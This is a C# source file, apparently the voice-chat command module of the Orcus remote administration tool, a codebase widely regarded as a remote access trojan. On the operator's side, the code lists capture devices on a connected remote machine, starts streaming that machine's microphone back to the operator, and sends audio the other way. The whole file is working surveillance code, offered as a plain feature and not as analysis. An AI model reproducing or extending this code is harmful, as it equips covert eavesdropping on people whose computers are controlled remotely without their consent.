using System;
using System.Collections.Generic;
using CSCore.CoreAudioAPI;
using CSCore.Streams;
using OpusWrapper.Native;
using Orcus.Administration.Plugins;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Commands.VoiceChat.Utilities;
using Orcus.Shared.Commands.VoiceChat;
using Orcus.Shared.Connection;
using Orcus.Shared.Data;
using Orcus.Shared.NetSerializer;

namespace Orcus.Administration.Commands.VoiceChat
{
    [ProvideLibrary(PortableLibrary.CSCore)]
    [ProvideLibrary(PortableLibrary.OpusWrapper)]
    public class VoiceChatCommand : Command
    {
        private CSCoreRecorder _cscoreRecorder;
        private CSCoreDataPlayer _cscoreDataPlayer;

        public override void Dispose()
        {
            base.Dispose();
            if (IsLocalStreaming)
                StopLocalStreaming();

            if (IsRemoteStreaming)
                StopRemoteStreaming();
        }

        public bool IsLocalStreaming { get; private set; }
        public bool IsRemoteStreaming { get; private set; }
        public List<CaptureDeviceInfo> RemoteCaptureDevices { get; private set; }

        public Application Application { get; set; }
        public int Bitrate { get; set; }

        public event EventHandler<SingleBlockReadEventArgs> LocalBlockRead;
        public event EventHandler<SingleBlockReadEventArgs> RemoteBlockRead;
        public event EventHandler CaptureDevicesReceived;

        public override void ResponseReceived(byte[] parameter)
        {
            switch ((VoiceChatCommunication) parameter[0])
            {
                case VoiceChatCommunication.ResponseAudioDevices:
                    RemoteCaptureDevices = Serializer.FastDeserialize<List<CaptureDeviceInfo>>(parameter, 1);
                    CaptureDevicesReceived?.Invoke(this, EventArgs.Empty);
                    LogService.Receive(
                        string.Format((string) System.Windows.Application.Current.Resources["CaptureDevicesReceived"],
                            RemoteCaptureDevices.Count));
                    break;
                case VoiceChatCommunication.ResponseAudioPackage:
                    _cscoreDataPlayer?.Feed(parameter, 1, parameter.Length - 1);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void StartLocalStreaming(MMDevice device)
        {
            if (IsLocalStreaming)
                return;

            IsLocalStreaming = true;
            ConnectionInfo.SendCommand(this, (byte) VoiceChatCommunication.StartLocalStreaming);
            _cscoreRecorder = new CSCoreRecorder(device, true, Bitrate, Application);
            _cscoreRecorder.Initialize();
            _cscoreRecorder.DataAvailable += CSCoreRecorderOnDataAvailable;
            _cscoreRecorder.SingleBlockRead += LocalBlockRead;

            LogService.Send((string) System.Windows.Application.Current.Resources["StartLocalStream"]);
        }

        public void StartRemoteStreaming(CaptureDeviceInfo device)
        {
            if (IsRemoteStreaming)
                return;

            IsRemoteStreaming = true;
            _cscoreDataPlayer = new CSCoreDataPlayer(true);
            _cscoreDataPlayer.Initialize();
            _cscoreDataPlayer.SingleBlockRead += RemoteBlockRead;

            var voiceChatInfoData =
                Serializer.FastSerialize(new VoiceChatBeginCaptureInfo
                {
                    Application = (int) Application,
                    Bitrate = Bitrate,
                    DeviceId = device.Id
                });

            ConnectionInfo.UnsafeSendCommand(this, new WriterCall(voiceChatInfoData.Length + 1, stream =>
            {
                stream.WriteByte((byte) VoiceChatCommunication.StartRemoteStreaming);
                stream.Write(voiceChatInfoData, 0, voiceChatInfoData.Length);
            }));

            LogService.Send((string) System.Windows.Application.Current.Resources["StartRemoteStream"]);
        }

        public void StopLocalStreaming()
        {
            if (!IsLocalStreaming)
                return;

            IsLocalStreaming = false;
            _cscoreRecorder.Dispose();
            _cscoreRecorder = null;

            ConnectionInfo.SendCommand(this, (byte) VoiceChatCommunication.StopLocalStreaming);
            LogService.Send((string) System.Windows.Application.Current.Resources["StopLocalStream"]);
        }

        public void StopRemoteStreaming()
        {
            if (!IsRemoteStreaming)
                return;

            IsRemoteStreaming = false;

            ConnectionInfo.SendCommand(this, (byte) VoiceChatCommunication.StopRemoteStreaming);
            _cscoreDataPlayer.Dispose();
            _cscoreDataPlayer = null;
            LogService.Send((string) System.Windows.Application.Current.Resources["StopRemoteStream"]);
        }

        public void GetCaptureDevices()
        {
            ConnectionInfo.SendCommand(this, (byte) VoiceChatCommunication.GetRemoteAudioDevices);
            LogService.Send((string) System.Windows.Application.Current.Resources["GetRemoteCaptureDevices"]);
        }

        // ReSharper disable once InconsistentNaming
        private void CSCoreRecorderOnDataAvailable(object sender, DataInfoAvailableEventArgs dataInfoAvailableEventArgs)
        {
            ConnectionInfo.UnsafeSendCommand(this, new WriterCall(dataInfoAvailableEventArgs.DataInfo.Length + 1,
                writer =>
                {
                    writer.Write((byte) VoiceChatCommunication.SendAudioPackage);
                    dataInfoAvailableEventArgs.DataInfo.WriteIntoStream(writer.BaseStream);
                }));
        }

        protected override uint GetId()
        {
            return 33;
        }
    }
}